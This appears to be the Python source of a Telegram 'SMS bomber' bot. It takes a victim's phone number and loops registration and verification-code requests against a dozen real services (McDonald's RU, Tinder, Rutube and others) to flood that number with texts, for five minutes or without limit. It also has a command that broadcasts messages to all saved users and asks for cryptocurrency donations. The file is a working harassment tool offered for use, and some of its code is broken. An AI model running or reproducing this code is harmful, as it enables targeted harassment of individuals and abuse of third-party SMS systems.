import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time

TOKEN = ''

THREADS_LIMIT = 10000

chat_ids_file = 'chat_ids.txt'

text1 = 'BTC Banker QR-code'
img1 = 'https://imbt.ga/LXah7Y2JG1'

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
    #This function adds user's id to the "chat_ids.txt" document
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='SMS Attack')
    stop = types.KeyboardButton(text='Spam Stop')
    info = types.KeyboardButton(text='Information')

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, 'You\'re welcome!🙋‍♂!\nThat\'s the SMS bomber\nYou are responsible for using this bot.\nChoose the action:',  reply_markup=keyboard)
    save_chat_id(message.chat.id)

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = f'!Spam is launched for an unlimited time for this number: +{phone_number}!'
    else:
         msg = f'!Spam is launched for 5 minutes for this number: +{phone_number}!'

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes = 5)
    while (datetime.now() < end) or force:
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'!{phone_number} bombing is stopped!')
    THREADS_AMOUNT[0] -= 1 # it's 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass


def send_for_number(phone):
        request_timeout = 0.00001
        while True:
         requests.get('https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone})
         #requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={}) /////////////////////////// НУЖНЫ ДРУГИЕ СЕРВИСЫ БЛЯДЬ, ЭТИ УМЕРЛИ СУКА БЛЯДЬ
         requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
         requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
         requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
         requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + phone})
         requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
         requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
         requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone})
         requests.post('https://www.rabota.ru/remind', data={'credential': phone})
         requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
         requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
         requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, '!You have already started spamming. Wait for the end or click \'Stop spam\' and try again!')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, '!Servers are now overloaded. Try again in a few minutes!')
        print('!The maximum number of threads is executed. Action canceled!')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == 'Information':
        bot.send_message(chat_id, 'Created by @noded\nFor cooperation and advertising, contact the bot creator in PM\nGuys who can help develop my bot, you are welcome.\nBTC Banker: 139mvDotDge6MkZCnRAZbPS6QziWm2efmh \n\n')
        bot.send_message(chat_id, f'{text1}\n{img1}')

    elif text == 'SMS Attack':
        bot.send_message(chat_id, 'Enter the number without in the format:\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx\n🇺🇿 9989xxxxxxxx')

    elif text == 'spamtousers':
        bot.send_message(chat_id, '!Enter a message in the format: "sendit: your_text" without quotes!')

    elif text == 'Stop Spam':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'You have not started spam')
        else:
            running_spams_per_chat_id.remove(chat_id)

    elif 'sendit: ' in text:
        msg = text.replace("sendit: ","")
        send_message_users(msg)

    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)

    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)

    elif len(text) == 12 and text[0]=='*':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    elif len(text) == 13 and text[0]=='*':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'Please enter a valid phone number. Entered {len(text)} symbols, waits: 11')
        print(f'Number is incorrect. Entered {len(text)} symbols, ожидается 11')

if __name__ == '__main__':
    bot.polling(none_stop=True)
